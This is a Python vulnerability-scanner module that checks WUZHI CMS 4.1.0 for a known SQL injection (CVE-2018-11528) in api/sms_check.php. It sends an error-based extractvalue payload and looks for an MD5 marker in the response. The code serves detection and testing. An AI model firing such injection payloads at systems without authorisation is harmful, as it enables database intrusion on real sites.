# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WuZhiCMS_0004'  # 平台漏洞编号
    name = 'WUZHI CMS SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2018-06-04'  # 漏洞公布时间
    desc = '''
    WUZHI CMS是中国五指（WUZHI）互联科技公司的一套基于PHP和MySQL的开源内容管理系统（CMS）
    WUZHI CMS 4.1.0版本中存在SQL注入漏洞。远程攻击者可借助api/sms_check.php?param= URI利用该漏洞执行任意的SQL命令。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-10859'
    cnvd_id = 'CNVD-2018-10859'  # cnvd漏洞编号
    cve_id = 'CVE-2018-11528 '  # cve编号
    product = 'WuZhiCMS'  # 漏洞组件名称
    product_version = '4.1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '30a5dbad-6e82-40b5-a7b7-2a708ab4e52c'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/api/sms_check.php?param=1'and extractvalue(1,concat(0x7e,md5(123)))%23"
            vul_url = arg + payload
            response = requests.get(vul_url)
            if response.status_code == 200 and '202cb962ac59075b964b07152d234b7' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
